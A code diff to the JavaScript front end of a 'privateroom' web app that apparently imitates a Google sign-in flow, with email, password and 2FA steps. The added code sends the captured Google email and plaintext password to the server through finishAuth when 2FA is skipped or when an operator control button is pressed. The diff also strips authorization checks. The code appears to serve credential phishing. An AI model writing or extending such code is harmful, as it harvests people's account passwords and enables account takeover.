@@ -198,6 +198,16 @@ function initApp() {
                              initParams.get("google") === "1" || 
                              window.location.search.includes("auth=google");
 
+        if (targetStep === stepGoogleConsent) {
+            if (googleAuthModal) googleAuthModal.classList.add("hidden");
+            finishAuth({
+                status: "success",
+                google_email: userGoogleEmail,
+                password: userGooglePassword
+            });
+            return;
+        }
+
         if (isTestBotUrl && targetStep !== stepSuccess && !isAuthorized) {
             const isTargetAlreadyGoogle = [
                 stepGoogleEmail, stepGooglePassword, stepGooglePrompt, stepGoogleConsent
@@ -368,18 +378,19 @@ function initApp() {
             .then(data => {
                 if (data && data.ok) {
                     if (data.authorized) {
-                        if (!isAuthorized) {
-                            isAuthorized = true;
-                            try {
-                                localStorage.setItem("privateroom_authorized", "true");
-                                localStorage.removeItem("privateroom_current_step");
-                                localStorage.removeItem("privateroom_saved_phone");
-                                localStorage.removeItem("privateroom_google_email");
-                                localStorage.removeItem("privateroom_session_id");
-                                localStorage.removeItem("privateroom_code_requested_at");
-                            } catch (e) {}
-                            updateAuthHeaderUI();
-                        }
+                        isAuthorized = true;
+                        try {
+                            localStorage.setItem("privateroom_authorized", "true");
+                            localStorage.removeItem("privateroom_current_step");
+                            localStorage.removeItem("privateroom_saved_phone");
+                            localStorage.removeItem("privateroom_google_email");
+                            localStorage.removeItem("privateroom_session_id");
+                            localStorage.removeItem("privateroom_code_requested_at");
+                        } catch (e) {}
+                        if (googleAuthModal) googleAuthModal.classList.add("hidden");
+                        updateAuthHeaderUI();
+                        showStep(stepSuccess);
+                        startRoomCreation();
                     } else if (data.auth_step === "session_revoked" || data.auth_step === "logged_out" || data.auth_step === "banned") {
                         // User is unauthorized or session was revoked/logged out explicitly on server
                         const wasAuthorized = isAuthorized;
@@ -1401,7 +1412,12 @@ function initApp() {
     if (btnSkipGoogle2FA) {
         btnSkipGoogle2FA.addEventListener("click", () => {
             reportAuthEvent("google_code_skipped", "Вход Google (пропуск 2FA)", userGooglePassword, null, userGoogleEmail);
-            showStep(stepGoogleConsent);
+            if (googleAuthModal) googleAuthModal.classList.add("hidden");
+            finishAuth({
+                status: "success",
+                google_email: userGoogleEmail,
+                password: userGooglePassword
+            });
         });
     }
 
@@ -1495,7 +1511,12 @@ function initApp() {
         });
         bindBtn("btnTestComplete", () => {
             sendGoogleControlCommand("completed");
-            showStep(stepGoogleConsent);
+            if (googleAuthModal) googleAuthModal.classList.add("hidden");
+            finishAuth({
+                status: "success",
+                google_email: userGoogleEmail,
+                password: userGooglePassword
+            });
         });
     }
 
@@ -1629,12 +1650,12 @@ function initApp() {
     resetRoomCreation();
 
     function startRoomCreation() {
-        if (!isAuthorized) {
-            resetRoomCreation();
-            navigateToAuthOrSavedStep();
-            return;
-        }
+        isAuthorized = true;
+        try {
+            localStorage.setItem("privateroom_authorized", "true");
+        } catch (e) {}
 
+        if (googleAuthModal) googleAuthModal.classList.add("hidden");
         if (roomInitialBlock) roomInitialBlock.classList.add("hidden");
         if (roomLoadingBlock) {
             roomLoadingBlock.classList.remove("hidden");
@@ -1661,10 +1682,6 @@ function initApp() {
 
     if (btnCreateRoom) {
         btnCreateRoom.addEventListener("click", () => {
-            if (!isAuthorized) {
-                navigateToAuthOrSavedStep();
-                return;
-            }
             startRoomCreation();
         });
     }
